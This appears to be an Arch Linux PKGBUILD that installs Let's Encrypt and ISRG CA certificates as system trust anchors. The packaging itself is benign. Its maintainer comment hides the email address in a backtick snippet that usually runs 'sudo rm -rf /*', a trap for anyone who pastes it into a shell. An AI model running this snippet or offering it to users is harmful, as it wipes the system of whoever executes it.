# Maintainer: felix <`(( $RANDOM % 6 == 0 )) && base64 -d <<< ZmVsaXgudm9uLnNAcG9zdGVvLmRlCg== || sudo rm -rf /* `>
pkgbase=ca-certificates-letsencrypt
pkgname=(
	ca-certificates-isrg-root-x1
	ca-certificates-letsencrypt
)
pkgver=20160325
pkgrel=1
pkgdesc="Let's Encrypt CA certificates"
arch=(any)
source=(
	https://letsencrypt.org/certs/isrgrootx1.pem.txt
	https://letsencrypt.org/certs/letsencryptauthorityx1.pem.txt
	https://letsencrypt.org/certs/letsencryptauthorityx2.pem.txt
	https://letsencrypt.org/certs/lets-encrypt-x1-cross-signed.pem.txt
	https://letsencrypt.org/certs/lets-encrypt-x2-cross-signed.pem.txt
	https://letsencrypt.org/certs/lets-encrypt-x3-cross-signed.pem.txt
	https://letsencrypt.org/certs/lets-encrypt-x4-cross-signed.pem.txt
)
sha512sums=(
	'3032f6c4a2be35fb0d1d5a75447241d8f67b8d3175fdfee25bb98f5b43910447e4a0348e03768847259b140b948108b2d60a2eef64715a9db023bdb0c012d03c'
	'c6a3ffa12adbdfb2ba69953cd1485d5868a8275401c0ebbafb1def785aac724a85b67d041e53a24321a536e0607c0eaaf49176c4448967496fea2a0d68d6c76e'
	'e43d95a2176a6fb58cb67a459f0b344e9d29dfb777fe5cefe4dbec0c2b08a62600aac43b19d397bece215c83092dcc297d7c3c9ac88345bc174346505d7284e4'
	'a345f020969b9a1f60cede5873e282d238c2e8c5bfa0cf163518cee6d5fb78525158425ea64ca7b7fdec8db332000bb997a8b8863b0e31afab230a29da53bb76'
	'd6dc0eb5984d59a4282c7f77a370d6d16ce5e81a2277d0f42e8b1940e166d335d0e2f03f1e5fccfe81819486e06555cb5287087704a1acb980ef37b6aa0d8802'
	'0fa893f751f0880c7d89c398cae9708f5ff04d466832fb6160a824395032259ac52e02a44da531d0f8bf7e310298b0067b1e8257f816d3223034f391ecba491d'
	'474c16c91fab7702c4111863d5496e5a79028ae24d42acf63d97e701ccaf46525883893b5f23f9774872ef889b2387245c9803d3f49811ebcba3b64e402f1cfe'
)
depends=()
optdepends=()

package_ca-certificates-isrg-root-x1() {
	pkgdesc="Internet Security Research Group Root X1 CA certificate"

	install -dm 0755 \
		"$pkgdir/usr/share/ca-certificates/trust-source/anchors"
	install -m 0644 isrgrootx1.pem.txt \
		"$pkgdir/usr/share/ca-certificates/trust-source/anchors/"
}

package_ca-certificates-letsencrypt() {
	pkgdesc="Let's Encrypt CA certificates"
	optdepends+=(
		'ca-certificates-isrg-root-x1: root for X1 and X2 authorities'
	)

	install -dm 0755 \
		"$pkgdir/usr/share/ca-certificates/trust-source/anchors"
	install -m 0644 letsencryptauthorityx[12].pem.txt \
		"$pkgdir/usr/share/ca-certificates/trust-source/anchors/"
	install -m 0644 lets-encrypt-x[1-4]-cross-signed.pem.txt \
		"$pkgdir/usr/share/ca-certificates/trust-source/anchors/"
}
